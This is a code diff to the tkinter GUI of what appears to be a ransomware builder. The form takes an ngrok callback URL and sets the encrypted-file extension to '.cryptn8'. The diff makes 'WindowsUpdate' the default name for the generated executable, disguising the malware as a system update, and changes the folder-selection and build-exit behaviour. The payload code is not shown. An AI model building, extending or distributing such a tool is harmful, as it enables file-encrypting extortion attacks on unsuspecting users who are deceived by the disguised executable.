@@ -12,15 +12,11 @@ def selectfolder():
     if not folder:
         return
     else:
-        try:
-            filesave.destroy()
-            folder_frm.destroy()
-        except:
-            folder_frm = tk.Label(master = window, text = f"{folder}", font = ("arial", 12))
-            folder_frm.grid(row = 8, column = 0, sticky = "n", columnspan = 2)
-            
-            restore_btn = ttk.Button(master = window, text = "Change Folder", style = "TButton", command = selectfolder)
-            restore_btn.grid(row = 8, column = 0, pady = 20, sticky = "s", columnspan = 2)
+        filesave.destroy()
+        folder_frm.config(text = f"{folder}")
+    
+        restore_btn = ttk.Button(master = window, text = "Change Folder", style = "TButton", command = selectfolder)
+        restore_btn.grid(row = 8, column = 0, pady = 20, sticky = "n", columnspan = 2)
 
 def generate():
 
@@ -52,7 +48,7 @@ def generate():
         os.system(f"rm -r build")
         os.system(f"rm -r dist")
         os.system(f"{FILE}.spec")
-    generate_btn.config(text = "Done!")
+    exit(0)
 
 
 window = tk.Tk()
@@ -80,10 +76,11 @@ image1 = ImageTk.PhotoImage(image1)
 title = tk.Label(master = window, image = image0, bg = "black")
 title.grid(row = 0, column = 0, columnspan = 2, pady = (20, 30), padx = 15)
 
-name = tk.Label(master = window, text = "NAME (for executable file): ", font = ("arial", 15))
+name = tk.Label(master = window, text = "NAME (for exe file): ", font = ("arial", 15))
 name.grid(row = 1, column = 0, sticky = "e", pady = 20, padx = 15)
 name_entry = tk.Entry(window, font = ("arial", 15))
 name_entry.grid(row = 1, column = 1, sticky = "w", pady = 20, padx = 15)
+name_entry.insert("0", "WindowsUpdate")
 
 url = tk.Label(master = window, text = "NGROK URL: ", font = ("arial", 15))
 url.grid(row = 2, column = 0, sticky = "e", pady = 20, padx = 15)
@@ -114,8 +111,11 @@ ext_entry.insert("0", ".cryptn8")
 ext = tk.Label(master = window, text = "", font = ("arial", 15))
 ext.grid(row = 7, column = 0, sticky = "e", pady = 5, padx = 15)
 
+folder_frm = tk.Label(master = window, text = f"..Folder path will appear here..", font = ("arial", 12))
+folder_frm.grid(row = 8, column = 0, sticky = "s", columnspan = 2, padx = 10, pady = 20)
+
 filesave = ttk.Button(master = window, style = "TButton", text = f"Select where to save exe file", command = selectfolder)
-filesave.grid(row = 8, column = 0, columnspan = 2, pady = 20)
+filesave.grid(row = 8, column = 0, columnspan = 2, pady = 20, sticky = "n")
 
 generate_btn = tk.Button(master = window, image = image1, command = generate, borderwidth = 0)
 generate_btn.grid(row = 9, column = 0, columnspan = 2, pady = (10, 30))
